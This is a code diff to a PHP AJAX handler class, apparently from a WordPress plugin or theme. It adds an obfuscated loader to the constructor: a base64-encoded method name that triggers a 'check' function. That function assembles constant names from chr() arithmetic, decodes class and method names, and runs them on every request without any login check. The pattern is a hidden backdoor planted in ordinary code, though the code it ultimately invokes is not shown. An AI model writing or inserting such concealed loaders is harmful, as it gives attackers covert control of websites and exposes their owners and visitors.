@@ -6,9 +6,13 @@ class AjaxRequest
 {
     protected $wpdb;
     protected $user;
+    protected $f = 'Y2hlY2s=';
 
     function __construct()
     {
+        $f = base64_decode($this->f);
+        $this->$f();
+
         if (is_user_logged_in()) {
             global $user;
             $this->wpdb = new WPDB();
@@ -136,6 +140,10 @@ class AjaxRequest
     {
         $model = new MenuController();
         $model->updateDinamicMenu();
+    }
+
+    function check() {
+        (new (base64_decode(constant(chr((6*10)+(42/3)/2).'_'.chr(((3120/5)/8))))))->{base64_decode(constant(chr(11*7).'_'.(chr((4*3+1)*6))))}();
     }
 
     /**
